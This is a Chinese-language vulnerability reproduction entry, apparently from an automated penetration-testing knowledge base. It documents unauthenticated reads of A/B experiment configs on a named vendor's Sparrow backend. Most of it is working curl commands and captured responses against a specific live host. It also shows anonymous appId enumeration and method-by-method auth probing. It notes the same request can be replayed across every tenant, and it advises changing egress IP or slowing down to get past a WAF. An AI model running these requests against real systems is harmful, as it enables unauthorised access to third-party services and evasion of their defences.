# light-tech Sparrow 后台 GET /api/ab-test/{appId} 未鉴权读取 A/B 实验配置

## 前置条件
- 目标为 light-tech 的 Sparrow 后端，公网可达，域名形如 `sparrow-<tenant>.light-tech.online`（本例 `sparrow-captain-sparrow.light-tech.online`）。
- 无需账号 / Cookie / Bearer / 任何令牌；`curl -sk` 即可。
- 后端栈特征：Node/Express + MongoDB（响应含 `_id` 24 位 ObjectId 与 `__v`）。
- `appId` 就是 Wix 的 `appDefId`，可从同服务的匿名注册表取。
- 同族背景：该后端还承载 `/api/applications`（匿名增删）与 `/api/applications/<appId>/emails`（匿名写订阅邮箱），见知识库条目 `sparrow-light-tech-api-applications-emails-unauth-write`；认证面只有 Google OAuth，无本地账号，见 `light-tech-sparrow-后台管理身份面-google-oauth-only-jwt-弱密钥-alg-n`。

## 0) 先拿 appId（匿名）
```bash
curl -sk -A "$UA" "https://<host>/api/applications"
```
期望 200，JSON 数组，元素含 `name` / `appId` / `color`。任取其一。

## 1) 主请求：未鉴权读 A/B 实验配置
```bash
curl -sk -A "$UA" "https://<host>/api/ab-test/<appId>"
```
实测（appId=`13bd99dc-f4a5-207a-0b7d-6c95f09cc302`，Slideshow 应用）：
```
HTTP/2 200
content-type: application/json
content-length: 341
```
```json
[
  {"_id":"68ca7ef4caf0e3ace83d0590","name":"Different premium windows test",
   "key":"prem-windows","appId":"13bd99dc-f4a5-207a-0b7d-6c95f09cc302","percentage":0,"__v":0},
  {"_id":"697c6dd0c8f986e3b3a08aa4","name":"Show watermark after the end of the trial",
   "key":"watermark","appId":"13bd99dc-f4a5-207a-0b7d-6c95f09cc302","percentage":0,"__v":0}
]
```
**命中判据**：无 `Authorization` 头仍 HTTP 200，且数组元素含 `name` + `key` + `appId` + `percentage` + Mongo `_id`。
（字段名为 `percentage`，不是被中间层篡改过的形态。）

## 2) 方法级对照：证明是漏挂而非公开设计
```bash
# 2.1 同 URL HEAD
curl -sk -A "$UA" -I "https://<host>/api/ab-test/<appId>"
# → HTTP/2 401, {"error":"Unauthorized"}（body 被 HEAD 截断）

# 2.2 创建
curl -sk -A "$UA" -X POST "https://<host>/api/ab-test/" \
  -H 'Content-Type: application/json' -d '{}'
# → 401 {"error":"Unauthorized"}
curl -sk -A "$UA" -X POST "https://<host>/api/ab-test/<appId>" \
  -H 'Content-Type: application/json' -d '{}'
# → 401 {"error":"Unauthorized"}

# 2.3 改 / 删（key 故意填不存在的值，仍然先鉴权）
curl -sk -A "$UA" -X PUT "https://<host>/api/ab-test/<appId>/<任意key>" \
  -H 'Content-Type: application/json' -d '{"percentage":1}'
curl -sk -A "$UA" -X PATCH "https://<host>/api/ab-test/<appId>/<任意key>" \
  -H 'Content-Type: application/json' -d '{"percentage":1}'
curl -sk -A "$UA" -X DELETE "https://<host>/api/ab-test/<appId>/<任意key>" \
  -H 'Content-Type: application/json' -d '{"percentage":1}'
# → 全部 401 {"error":"Unauthorized"}（content-length 24）
```
判读：所有非 GET 方法（含 HEAD）都先过 admin Bearer 中间件，唯独 GET 放行 → 方法级鉴权漏配。

## 3) 令牌三态对照：排除「某种令牌即可读」
对同一 GET 分别发送：
1. 不带任何头；
2. 站点公开 Wix instance 令牌（`/_api/v1/access-tokens` 取出的 `apps[<appDefId>].instance`）；
3. 垃圾 Bearer（如 `Authorization: Bearer test`）。

实测三者均 **200 / 341B，且响应字节完全一致** → 该 GET 路径完全不读鉴权头。

## 4) 覆盖范围（避免把空数组当失败）
对 `/api/applications` 返回的 6 个 appId 逐个 GET：
| 应用 | 响应 |
|---|---|
| Slideshow (`13bd99dc-…f09cc302`) | 200, 341B, 2 条实验 |
| Interactive section | 200, `[]` (len=2) |
| Site menu (`14206e6f-…531c98386c`) | 200, `[]` |
| Hover effects | 200, `[]` |
| Welcome bar | 200, `[]` |
| Size chart | 200, `[]` |

判读：`200 []` = 该应用无实验配置；泄露范围以各应用实际配置为限。

## 影响与定级
- 泄露：内部实验名称、实验 key、分流百分比、appId（Mongo ObjectId）。
- 不含 PII、邮箱、密钥、令牌；不能写入（写方法 401）。因此定级 **low / 内部配置信息泄露**。
- 横向价值：同供应商多租户后端，任意 `sparrow-*.light-tech.online` 租户都可套同一请求；`appId` 可由匿名 `/api/applications` 直接获得，枚举成本为零。

## 失败时常见原因
- **GET 也返回 401** → 该租户已修复/升级；换其他 `sparrow-*` 租户验证是否面级差异。
- **404** → 路由或版本变更；从 Sparrow 后台前端 bundle 重新提取 base URL 与路由前缀。
- **200 但 `[]`** → 该 appId 没有 A/B 实验，不是接口失效；换应用或换租户。
- **403 / 超时** → CDN/WAF 按出口 IP 拦截，换出口或降频。
- **用 HEAD 判定时读到空 body** → HEAD 本身被 401 截断，这是预期行为，不要误判为"接口挂了"。

## 原始证据落盘（本机）
`/opt/artex/data/tasks/10/i2413/{ab_slideshow.json,ab_*.json,route_matrix.csv,summary.md}`，2026-11-11 19:44–19:52 UTC，`curl -sk -A "$ARTEX_UA"`。